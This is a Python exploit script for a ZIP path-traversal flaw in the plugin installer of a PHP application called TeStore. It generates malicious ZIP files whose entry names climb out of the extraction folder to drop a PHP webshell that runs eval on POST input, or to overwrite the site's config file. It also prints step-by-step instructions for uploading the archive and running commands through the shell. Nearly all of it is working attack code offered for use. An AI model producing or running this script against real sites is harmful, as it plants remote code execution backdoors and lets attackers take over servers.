#!/usr/bin/env python3
"""
TeStore Zip Path Traversal Exploit
CVSS: 7.5 High

Target: TeStore/Action.php
Vulnerability: Path traversal via malicious ZIP file during plugin installation

Usage:
    python3 testore_zip_trav.py [action]

Actions:
    generate  - Generate malicious ZIP file (default)
    exploit   - Full exploit demonstration

Example:
    python3 testore_zip_trav.py generate
"""

import zipfile
import io
import os
import sys

class TeStoreExploit:
    def __init__(self):
        self.webshell = b'''<?php
// Malicious Plugin - Immediate RCE
if(isset($_POST['x'])) {
    eval($_POST['x']);
}
?>'''
        
        self.plugin_info = b'''<?php
// Plugin info for TeStore
class Malicious {
    public static function activate() {
        return true;
    }
}
?>'''
    
    def create_malicious_zip(self, target_path='../Shell.php'):
        """Create a ZIP file with path traversal filename"""
        
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Add malicious file with path traversal
            zipf.writestr(target_path, self.webshell)
            
            # Add valid Plugin.php structure
            zipf.writestr('Plugin.php', self.plugin_info)
            
            # Add Package.json
            zipf.writestr('Package.json', b'{"name":"Malicious","version":"1.0"}')
        
        zip_buffer.seek(0)
        return zip_buffer.read()
    
    def generate_payloads(self):
        """Generate various path traversal payloads"""
        
        payloads = {
            'webshell': self.create_malicious_zip('../Shell.php'),
            'plugin_override': self.create_malicious_zip('../../plugins/Malicious.php'),
            'config_write': self.create_malicious_zip('../../config.inc.php'),
        }
        
        print("[*] Generating malicious ZIP payloads...")
        print("")
        
        for name, data in payloads.items():
            filename = f'malicious_{name}.zip'
            with open(filename, 'wb') as f:
                f.write(data)
            print(f"[+] Created: {filename} ({len(data)} bytes)")
        
        print("")
        print("[*] Exploitation steps:")
        print("    1. Host the ZIP file on a web-accessible server")
        print("    2. Go to TeStore plugin admin panel")
        print("    3. Enter the URL to your malicious ZIP")
        print("    4. The webshell will be extracted via path traversal")
        print("    5. Access: http://target/plugins/Malicious.php")
        print("")
        print("[*] Webshell usage:")
        print("    POST /plugins/Malicious.php")
        print("    x=system('whoami');")
        
        return payloads
    
    def test_zip_extraction(self):
        """Test if the ZIP extraction is vulnerable"""
        print("[*] Testing ZIP path traversal vulnerability...")
        
        # Create a test ZIP
        test_zip_data = self.create_malicious_zip('../test.txt')
        
        # Save to file
        with open('test_path_traversal.zip', 'wb') as f:
            f.write(test_zip_data)
        
        print("[+] Created: test_path_traversal.zip")
        print("[*] This ZIP contains: ../test.txt")
        print("")
        print("[*] When extracted by TeStore, it will attempt to write to:")
        print("    <temp_dir>/../test.txt")
        print("    Which resolves to parent directory!")
        
        return 'test_path_traversal.zip'

def main():
    exploit = TeStoreExploit()
    
    action = sys.argv[1] if len(sys.argv) > 1 else 'generate'
    
    if action == 'generate':
        exploit.generate_payloads()
    elif action == 'test':
        exploit.test_zip_extraction()
    else:
        print(f"Usage: {sys.argv[0]} [generate|test]")

if __name__ == "__main__":
    main()
